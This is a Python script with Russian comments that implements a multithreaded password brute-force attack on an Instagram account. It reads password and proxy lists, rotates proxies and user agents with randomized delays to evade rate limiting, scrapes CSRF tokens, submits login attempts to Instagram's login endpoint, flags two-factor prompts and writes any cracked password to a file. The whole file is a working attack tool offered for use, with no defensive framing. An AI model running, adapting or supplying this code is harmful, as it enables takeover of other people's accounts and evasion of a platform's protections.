#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Расширенный скрипт для перебора паролей Instagram
# Многопоточность, ротация прокси, работа с combo-файлами, обработка 2FA
# Требуются библиотеки: pip install requests beautifulsoup4

import requests
import random
import time
import threading
import queue
import sys
import os
import json
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List, Dict, Any, Tuple

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger('insta_bruteforce')

# Конфигурация
CONFIG = {
    "target_username": "target_account",
    "combo_file": "combo.txt",           # файл с паролями, по одному на строку
    "proxy_file": "proxies.txt",         # файл с прокси, по одному на строку
    "threads": 10,                       # количество потоков
    "retries": 3,                        # повторные попытки при ошибке
    "delay_min": 1.0,                    # минимальная задержка между попытками
    "delay_max": 3.0,                    # максимальная задержка
    "timeout": 20,                       # таймаут запроса
    "max_attempts": 1000,                # максимум попыток
}

# Расширенный список User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.6 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
]

# Класс для управления прокси
class ProxyManager:
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies: List[str] = []
        self.current_index = 0
        self.lock = threading.Lock()
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        if not self.proxies:
            self.proxies = ["http://127.0.0.1:8080"]  # заглушка, замените на свои рабочие прокси
        logger.info(f"Загружено прокси: {len(self.proxies)}")

    def get_next_proxy(self) -> str:
        with self.lock:
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy

    def random_proxy(self) -> str:
        return random.choice(self.proxies)

# Класс для управления combo-файлом
class ComboLoader:
    def __init__(self, combo_file: str):
        self.combo_file = combo_file
        self.passwords: List[str] = []
        self.load()

    def load(self):
        if os.path.isfile(self.combo_file):
            with open(self.combo_file, 'r', encoding='utf-8') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
        else:
            logger.warning(f"Combo-файл {self.combo_file} не найден, используются дефолтные пароли")
            self.passwords = ["123456", "password", "qwerty", "iloveyou", "admin123"]
        logger.info(f"Загружено паролей: {len(self.passwords)}")

    def get_passwords(self) -> List[str]:
        return self.passwords

# Основной класс атакующего
class InstagramBruteforcer:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config["target_username"]
        self.proxy_manager = ProxyManager(config.get("proxy_file"))
        self.combo_loader = ComboLoader(config.get("combo_file"))
        self.passwords = self.combo_loader.get_passwords()
        self.queue: queue.Queue = queue.Queue()
        self.found_password: Optional[str] = None
        self.lock = threading.Lock()
        self.attempt_count = 0

    def get_session(self, proxy: Optional[str] = None) -> requests.Session:
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.instagram.com/accounts/login/",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        })
        return session

    def get_csrf_token(self, session: requests.Session) -> Optional[str]:
        login_url = "https://www.instagram.com/accounts/login/"
        try:
            response = session.get(login_url, timeout=self.config["timeout"])
            csrf = response.cookies.get("csrftoken")
            if not csrf:
                # Попытка извлечь из HTML
                import re
                match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
                if match:
                    csrf = match.group(1)
            return csrf
        except Exception as e:
            logger.debug(f"Ошибка получения CSRF: {e}")
            return None

    def attempt_login(self, password: str, proxy: Optional[str] = None, retry_count: int = 0) -> Tuple[bool, str]:
        session = self.get_session(proxy)
        csrf = self.get_csrf_token(session)
        if not csrf:
            if retry_count < self.config["retries"]:
                time.sleep(random.uniform(1, 2))
                return self.attempt_login(password, self.proxy_manager.random_proxy(), retry_count + 1)
            return False, "Не удалось получить CSRF"

        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

        data = {
            "username": self.target,
            "enc_password": enc_password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "",
            "trustedDeviceRecords": "{}"
        }

        headers = {
            "x-csrftoken": csrf,
            "x-instagram-ajax": "1",
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://www.instagram.com/accounts/login/",
            "content-type": "application/x-www-form-urlencoded"
        }

        login_url = "https://www.instagram.com/accounts/login/ajax/"

        try:
            response = session.post(login_url, data=data, headers=headers, timeout=self.config["timeout"])
            if response.status_code == 200:
                result = response.json()
                if result.get("authenticated") or result.get("user") is True:
                    return True, f"Успех: {password}"
                else:
                    message = result.get("message", "Неверный пароль")
                    if "two_factor" in result or result.get("two_factor_required"):
                        return False, "Требуется 2FA"
                    return False, message
            else:
                return False, f"HTTP {response.status_code}"
        except Exception as e:
            if retry_count < self.config["retries"]:
                time.sleep(random.uniform(2, 5))
                return self.attempt_login(password, self.proxy_manager.random_proxy(), retry_count + 1)
            return False, f"Ошибка: {e}"

    def worker(self, thread_id: int):
        while not self.queue.empty() and self.found_password is None:
            try:
                password = self.queue.get_nowait()
            except queue.Empty:
                break

            proxy = self.proxy_manager.random_proxy()
            success, message = self.attempt_login(password, proxy)

            with self.lock:
                self.attempt_count += 1
                current = self.attempt_count
                if success:
                    self.found_password = password
                    logger.info(f"[Thread-{thread_id}] НАЙДЕН ПАРОЛЬ: {password}")
                    break
                else:
                    if self.attempt_count % 10 == 0:
                        logger.info(f"Попытка {current}/{len(self.passwords)}: {password} -> {message}")

            # Случайная задержка
            time.sleep(random.uniform(self.config["delay_min"], self.config["delay_max"]))

    def run(self):
        logger.info(f"Запуск атаки на {self.target}")
        for password in self.passwords[:self.config["max_attempts"]]:
            self.queue.put(password)

        total_threads = min(self.config["threads"], self.queue.qsize())
        logger.info(f"Используется потоков: {total_threads}")

        with ThreadPoolExecutor(max_workers=total_threads) as executor:
            futures = [executor.submit(self.worker, i) for i in range(total_threads)]
            for future in as_completed(futures):
                future.result()

        if self.found_password:
            logger.info(f"Пароль найден: {self.found_password}")
            # Сохранение результата
            with open("found_password.txt", "w") as f:
                f.write(f"{self.target}:{self.found_password}\n")
        else:
            logger.info("Пароль не найден в данном списке")

def main():
    config = CONFIG
    bruteforcer = InstagramBruteforcer(config)
    bruteforcer.run()

if __name__ == "__main__":
    main()